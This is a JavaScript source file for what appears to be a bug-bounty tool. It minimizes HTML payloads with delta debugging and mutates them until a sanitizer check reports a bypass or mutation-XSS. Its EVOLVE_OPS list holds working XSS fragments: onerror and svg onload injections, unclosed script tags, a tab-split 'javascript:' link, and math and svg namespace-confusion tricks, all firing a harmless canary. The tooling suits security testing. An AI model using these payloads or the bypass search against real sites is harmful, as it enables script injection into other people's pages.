/* ============================================================================
 * minimizer.js — v4.1 bounty-report weapon
 *
 * ddmin()   classic delta debugging: shrink a triggering payload to the
 *           smallest string that still satisfies the oracle. A 900-char
 *           bypass becomes a 40-char minimal PoC — exactly what a triage
 *           team wants to paste into a test.
 *
 * evolve()  the dp-WARN hunter: take a candidate the sanitizer *partly*
 *           survived (WARN = structural residue) and hammer it with focused
 *           mutation chains until the verdict flips to BYPASS/mXSS — or the
 *           budget runs out.
 *
 * Oracles are async fns (html) => bool. Static oracles are cheap; exec
 * oracles (canary-preserving minimization) cost a sandboxed iframe per test.
 * ========================================================================== */
"use strict";
const Minimizer = (() => {

  /* split into tag-aware chunks: keeps <...> runs atomic before char-level */
  function chunks(s, n) {
    const size = Math.max(1, Math.ceil(s.length / n));
    const out = [];
    for (let i = 0; i < s.length; i += size) out.push(s.slice(i, i + size));
    return out;
  }
  function tagChunks(s) {
    const parts = s.split(/(?=<)/g).filter(Boolean);
    return parts.length > 1 ? parts : [s];
  }

  /**
   * ddmin(html, oracle, opts) -> { html, reduced, origLen, steps, ms }
   * Zeller-style: subset removal at increasing granularity, tag pass first.
   */
  async function ddmin(html, oracle, opts) {
    const t0 = Date.now();
    const maxSteps = (opts && opts.maxSteps) || 400;
    let steps = 0;
    const ok = async s => { steps++; if (steps > maxSteps) return false;
                            try { return !!(await oracle(s)); } catch (e) { return false; } };

    if (!(await ok(html)))
      return { html, reduced: false, origLen: html.length, steps, ms: Date.now() - t0,
               error: "oracle does not hold on input" };

    /* pass 1 — remove whole tag segments */
    let test = html;
    let parts = tagChunks(test);
    let changed = true;
    while (changed && parts.length > 1 && steps < maxSteps) {
      changed = false;
      for (let i = 0; i < parts.length; i++) {
        const cand = parts.slice(0, i).concat(parts.slice(i + 1)).join("");
        if (cand && await ok(cand)) { parts.splice(i, 1); changed = true; break; }
      }
    }
    test = parts.join("");

    /* pass 2 — classic ddmin at char granularity */
    let n = 2;
    while (test.length >= 2 && steps < maxSteps) {
      const cs = chunks(test, n);
      let reduced = false;
      /* try removing each subset */
      for (let i = 0; i < cs.length; i++) {
        const cand = cs.slice(0, i).concat(cs.slice(i + 1)).join("");
        if (cand && cand !== test && await ok(cand)) {
          test = cand; n = Math.max(n - 1, 2); reduced = true; break;
        }
      }
      if (reduced) continue;
      /* try complements (keep exactly one subset) */
      for (let i = 0; i < cs.length; i++) {
        const cand = cs[i];
        if (cand !== test && await ok(cand)) {
          test = cand; n = 2; reduced = true; break;
        }
      }
      if (!reduced) {
        if (n >= test.length) break;
        n = Math.min(n * 2, test.length);
      }
    }
    return { html: test, reduced: test.length < html.length,
             origLen: html.length, steps, ms: Date.now() - t0 };
  }

  /* focused op set for verdict-flipping (heavier hitters than general fuzz) */
  const EVOLVE_OPS = [
    h => h.replace(/<math>/, "<math><mtext><table><mglyph><style>"),
    h => "<svg><desc>" + h,
    h => h.replace(/<style>/, "<style><!--"),
    h => h + "</style>",
    h => h.replace(/="/g, "=\"&#32;"),
    h => h.replace(/\s(on\w+)=/, (m, a) => " " + a + "=\"" + h0(h) + "\" "),
    h => h.replace(/</, "<!-- --!><"),
    h => h.replace(/>/, "><template>") ,
    h => h.replace(/(\s\w+)=("[^"]*")/, "$1=$1$1"),          // dup attr
    h => h.replace(/onerror=/, "onerror&NewLine;="),
    h => h.replace(/<(\w+)/, "<svg><foreignObject><$1"),
    h => "</math>" + h,
    h => h.replace(/<table>/, "<table><caption>"),
    h => h.replace(/\/style>/, "/style><img src=x onerror=__mxss.hit('evo')>"),
    /* pure injections — work from cold seeds, no structure required */
    h => h + "<scr" + "ipt>__mxss.hit('evo-inj')",            // unclosed script: regex-blind
    h => "<svg><desc>" + h + "<scr" + "ipt>__mxss.hit('evo-inj2')",
    h => h + "<a href=\"java\tscript:__mxss.hit('evo-tab')\">x</a>", // tab-split protocol
    h => h + "<svg onload=__mxss.hit('evo-svg')>",
    h => h + "<math><annotation-xml encoding=\"text/html\"><scr" + "ipt>__mxss.hit('evo-anno')"
  ];
  function h0(h) { return h.includes("__mxss") ? "" : "__mxss.hit('evo-attr')"; }

  /**
   * evolve(seedHtml, targetOracle, opts) -> { flipped, html, verdictTrail, rounds }
   * targetOracle(html) => true when the DESIRED verdict (e.g. BYPASS) holds.
   */
  async function evolve(seedHtml, targetOracle, opts) {
    const o = opts || {};
    const budget = o.budget || 200;
    const rng = (o.rng) || MutEngine.mulberry32((Date.now() & 0xffffff) >>> 0);
    const trail = [];
    let cur = seedHtml;
    if (await safeTarget(targetOracle, cur))
      return { flipped: true, html: cur, verdictTrail: trail, rounds: 0, note: "already holds" };

    for (let r = 0; r < budget; r++) {
      const op = EVOLVE_OPS[Math.floor(rng() * EVOLVE_OPS.length)];
      let next;
      try { next = op(cur); } catch (e) { continue; }
      let verdict;
      try { verdict = await targetOracle(next); } catch (e) { continue; }
      if (verdict) {
        trail.push({ round: r, op: op.name || "op", result: "FLIP" });
        return { flipped: true, html: next, verdictTrail: trail, rounds: r + 1 };
      }
      /* simulated annealing lite: accept drift 30% of the time */
      if (rng() < 0.3) cur = next;
      if (r % 25 === 0) trail.push({ round: r, result: "…" });
    }
    return { flipped: false, html: cur, verdictTrail: trail, rounds: budget };
  }
  async function safeTarget(fn, h) { try { return !!(await fn(h)); } catch (e) { return false; } }

  return { ddmin, evolve, EVOLVE_OPS };
})();
if (typeof module !== "undefined") module.exports = Minimizer;

/* ============================================================================
 * merged additions (K3) — score-based convenience wrappers over ddmin/evolve
 * ========================================================================== */
const MinimizerX = (() => {
  const verdictName = s => ["CLEAN", "WARN", "mXSS", "BYPASS"][s] || "?";

  /** shrink(html, engineIds, rng, opts) — ddmin holding score >= baseline */
  async function shrink(html, engineIds, rng, opts) {
    const baseline = Sanitizer.score(html, engineIds);
    if (baseline <= 0)
      return { ok: false, reason: "score 0 — nothing worth shrinking", result: html, steps: [] };
    const res = await Minimizer.ddmin(html,
      async h => Sanitizer.score(h, engineIds) >= baseline, opts || {});
    return { ok: true, result: res.html, origLen: res.origLen, after: res.html.length,
             oracleCalls: res.steps, ms: res.ms,
             reduction: Math.round((1 - res.html.length / html.length) * 100),
             scoreBefore: baseline, scoreAfter: Sanitizer.score(res.html, engineIds) };
  }

  /** climb(html, engineIds, rng, opts) — evolve toward BYPASS (score 3) */
  async function climb(html, engineIds, rng, opts) {
    const o = Object.assign({ budget: 200, target: 3 }, opts || {});
    const startScore = Sanitizer.score(html, engineIds);
    const res = await Minimizer.evolve(html,
      async h => Sanitizer.score(h, engineIds) >= o.target,
      { budget: o.budget, rng });
    return { ok: true, reached: res.flipped, result: res.html,
             startScore, finalScore: Sanitizer.score(res.html, engineIds),
             rounds: res.rounds, verdictTrail: res.verdictTrail,
             note: verdictName(startScore) + " → " + verdictName(Sanitizer.score(res.html, engineIds)) };
  }

  /** hunt(): climb, then shrink whatever the climb reached */
  async function hunt(html, engineIds, rng, opts) {
    const c = await climb(html, engineIds, rng, opts);
    const out = { climb: c };
    if (c.finalScore > 0) out.shrink = await shrink(c.result, engineIds, rng, opts);
    return out;
  }
  return { shrink, climb, hunt };
})();
if (typeof module !== "undefined") module.exports = Object.assign(Minimizer, MinimizerX);
